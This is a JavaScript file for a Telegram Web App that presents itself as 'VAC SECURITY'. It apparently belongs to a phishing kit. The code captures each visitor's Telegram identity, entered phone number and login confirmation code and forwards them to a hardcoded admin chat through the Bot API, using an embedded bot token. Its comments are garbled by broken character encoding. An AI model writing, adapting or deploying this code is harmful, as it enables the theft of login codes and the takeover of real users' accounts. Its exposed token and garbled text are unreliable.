// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è (–∑–∞–º–µ–Ω–∏—Ç–µ –∑–Ω–∞—á–µ–Ω–∏—è)
const BOT_TOKEN = '8196403348:AAGrU-BOJgX6nFZB7f_YV9trqrBGKplWWt0';
const ADMIN_ID = '5665980031';
const BASE_URL = 'https://otz2026.github.io/mybot';

// –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è
const formatMessage = (type, data, user) => {
    const userInfo = `üë§ ${user.first_name || '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å'} ${user.last_name || ''}\n` +
                    `üÜî ID: <code>${user.id || '?'}</code>\n` +
                    (user.username ? `@${user.username}\n` : '');
    
    switch(type) {
        case 'init':
            return {
                text: `üö™ <b>–ù–æ–≤—ã–π –≤—Ö–æ–¥ –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'exit':
            return {
                text: `üö∂ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã—à–µ–ª</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'phone':
            return {
                text: `üì± <b>–í–≤–µ–¥—ë–Ω –Ω–æ–º–µ—Ä:</b> <code>${data}</code>\n\n${userInfo}`,
                buttons: []
            };
        case 'code':
            return {
                text: `üî¢ <b>–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è:</b> <code>${data}</code>\n\n${userInfo}`,
                buttons: [
                    [
                        { 
                            text: "‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", 
                            url: `${BASE_URL}/yes.html?code=${data}&user_id=${user.id}` 
                        },
                        { 
                            text: "‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å", 
                            url: `${BASE_URL}/no.html?code=${data}&user_id=${user.id}` 
                        }
                    ]
                ]
            };
    }
};

// –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è
window.sendToBot = async (type, data = null) => {
    try {
        const tg = window.Telegram.WebApp;
        const user = tg.initDataUnsafe.user || {};
        const message = formatMessage(type, data, user);
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: `üîê <b>VAC SECURITY</b>\n\n${message.text}`,
                parse_mode: 'HTML',
                reply_markup: message.buttons.length ? { 
                    inline_keyboard: message.buttons 
                } : undefined
            })
        });
        
        return await response.json();
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
    }
};